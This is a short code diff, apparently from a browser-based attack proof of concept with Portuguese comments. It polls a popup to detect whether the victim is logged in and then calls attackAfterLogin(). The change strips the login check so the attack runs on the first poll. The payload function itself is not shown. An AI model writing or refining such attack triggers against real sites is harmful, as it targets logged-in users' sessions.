@@ -23,14 +23,12 @@
             try {
                 // Se conseguirmos acessar o popup e ele estiver na página de perfil
                 // Isso pode falhar por CORS, mas é uma tentativa
-                console.log("href", popup && popup.location.href)
-                console.log(popup && popup.location.href.includes('Welcome back,') ? "True" : "False")
-                if (popup && popup.location.href.includes('Welcome back,')) {
+               
                     clearInterval(checkPopupInterval);
                     
                     // Usuário está logado, agora podemos tentar o ataque
                     attackAfterLogin();
-                }
+                
             } catch(e) {
                 // Erro CORS ao tentar acessar o popup - é esperado
                 console.log("Verificando login...");
